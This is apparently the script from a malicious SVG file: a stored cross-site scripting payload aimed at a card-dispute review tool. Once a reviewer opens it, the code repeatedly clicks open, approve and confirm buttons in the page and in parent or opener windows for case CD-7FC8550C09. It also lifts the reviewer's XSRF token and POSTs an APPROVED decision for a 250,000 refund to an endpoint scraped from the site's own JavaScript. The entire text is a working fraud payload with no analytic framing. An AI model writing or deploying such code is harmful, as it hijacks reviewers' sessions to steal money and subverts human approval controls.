svg.script:
(() => {
  const caseReference = 'CD-7FC8550C09';
  const requestedAmount = 250000;
  const marker = document.getElementById('status');
  const label = value => { marker.textContent = value; };
  const cleanText = node => (node && node.textContent || '').replace(/\s+/g, ' ').trim();
  const visible = node => node && !node.disabled && node.offsetParent !== null;

  function roots() {
    const result = [document];
    try { if (parent && parent !== window) result.push(parent.document); } catch (_) {}
    try { if (opener && !opener.closed) result.push(opener.document); } catch (_) {}
    return result;
  }

  function clickReviewerUi(root) {
    const controls = () => Array.from(root.querySelectorAll('button, a, [role="button"]'));
    const caseContainer = Array.from(root.querySelectorAll('tr, article, section, li, div'))
      .filter(node => cleanText(node).includes(caseReference))
      .sort((a, b) => cleanText(a).length - cleanText(b).length)[0];

    if (caseContainer) {
      const open = controls().find(node => caseContainer.contains(node) && visible(node)
        && /^(view|open|review|inspect)(\s+(case|dispute|details|evidence))?$/i.test(cleanText(node)));
      if (open) { open.click(); label('case-opened'); }
    }

    const approve = controls().find(node => visible(node)
      && /^(approve|approve refund|issue refund|credit customer|settle|settle dispute|resolve and credit)$/i.test(cleanText(node)));
    if (approve) { approve.click(); label('approval-selected'); }

    const dialog = root.querySelector('dialog[open], [role="dialog"]');
    if (dialog) {
      const confirm = Array.from(dialog.querySelectorAll('button, [role="button"]')).find(node => visible(node)
        && /^(confirm|confirm approval|approve|issue refund|credit customer|settle|complete)$/i.test(cleanText(node)));
      if (confirm) { confirm.click(); label('approval-confirmed'); }
    }
  }

  function csrfCookie() {
    const item = document.cookie.split(';').map(value => value.trim())
      .find(value => value.startsWith('XSRF-TOKEN='));
    return item ? decodeURIComponent(item.split('=').slice(1).join('=')) : '';
  }

  function materialize(template) {
    return template
      .replace(/\$\{encodeURIComponent\([^}]+\)\}/g, encodeURIComponent(caseReference))
      .replace(/\$\{[^}]+\}/g, encodeURIComponent(caseReference))
      .replace(/\\\//g, '/');
  }

  async function invokeReviewerAction() {
    const sourceResponse = await fetch('/js/card-operations.js', { credentials: 'include', cache: 'no-store' });
    if (!sourceResponse.ok) return;
    const source = await sourceResponse.text();
    const paths = Array.from(source.matchAll(/[`'\"](\/api\/card-operations\/[^`'\"]+)[`'\"]/g), match => match[1]);
    const actionTemplate = paths.find(path => /approve|settle|resolve|credit|refund/i.test(path));
    if (!actionTemplate) return;

    const path = materialize(actionTemplate);
    await fetch('/api/event/csrf', { credentials: 'include', cache: 'no-store' });
    const token = csrfCookie();
    const response = await fetch(path, {
      method: 'POST',
      credentials: 'include',
      cache: 'no-store',
      headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': token,
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        caseReference,
        decision: 'APPROVED',
        status: 'APPROVED',
        amount: requestedAmount,
        approvedAmount: requestedAmount
      })
    });
    label(response.ok ? 'review-submitted' : `review-${response.status}`);
  }

  let cycles = 0;
  const timer = setInterval(() => {
    cycles += 1;
    for (const root of roots()) {
      try { clickReviewerUi(root); } catch (_) {}
    }
    if (cycles >= 120) clearInterval(timer);
  }, 500);

  invokeReviewerAction().catch(() => label('review-action-failed'));
})();
